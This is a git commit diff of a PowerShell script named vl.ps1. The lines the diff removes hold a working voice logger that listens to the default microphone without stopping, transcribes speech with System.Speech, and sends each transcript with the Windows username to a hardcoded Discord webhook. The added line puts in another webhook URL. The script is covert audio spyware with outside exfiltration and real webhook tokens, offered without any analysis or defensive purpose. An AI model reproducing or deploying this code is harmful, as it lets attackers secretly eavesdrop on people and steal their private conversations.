ca5cc3f15bb61f221eb1f899ecd5e306326854fc
johnusroot0101 <93643015+johnusroot0101@users.noreply.github.com>
2023-05-09 17:58:28 -0700

    vl.ps1
    asd

--- vl.ps1
+++ vl.ps1
@@ -6,55 +6,7 @@ function DC-Upload {
 		[string]$text 
 	)
 
-	# $dc = 'function DC-Upload {
-
-	[CmdletBinding()]
-	param (
-		[parameter(Position=0,Mandatory=$False)]
-		[string]$text 
-	)
-
-	 $dc = 'https://discord.com/api/webhooks/1103578677251424336/WXTNFRio4ss_OYP-_qWHR4VOCdMBjP03zWr8R-kp7rTXlsTiWfYiqcYOLNV-YgDfrE9e'
-
-	$Body = @{
-	  'username' = $env:username
-	  'content' = $text
-	}
-
-	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
-}
-
-
-
-function voiceLogger {
-
-    Add-Type -AssemblyName System.Speech
-    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-    $grammar = New-Object System.Speech.Recognition.DictationGrammar
-    $recognizer.LoadGrammar($grammar)
-    $recognizer.SetInputToDefaultAudioDevice()
-
-    while ($true) {
-        $result = $recognizer.Recognize()
-        if ($result) {
-            $results = $result.Text
-            Write-Output $results
-            $log = "$env:tmp/VoiceLog.txt"
-            echo $results > $log
-            $text = get-content $log -raw
-            DC-Upload $text
-
-            # Use a switch statement with the $results variable
-            switch -regex ($results) {
-                '\bnote\b' {saps notepad}
-                '\bexit\b' {break}
-            }
-        }
-    }
-    Clear-Content -Path $log
-}
-
-voiceLogger'
+	# $dc = 'https://discord.com/api/webhooks/1105656827582103663/Nvg0wSU4YJpEm60uWLYVhfWtPR8iyPTEBGc05frEhn87o9PUg1OvxQb8XH6KSc4EHIYS'
 
 	$Body = @{
 	  'username' = $env:username
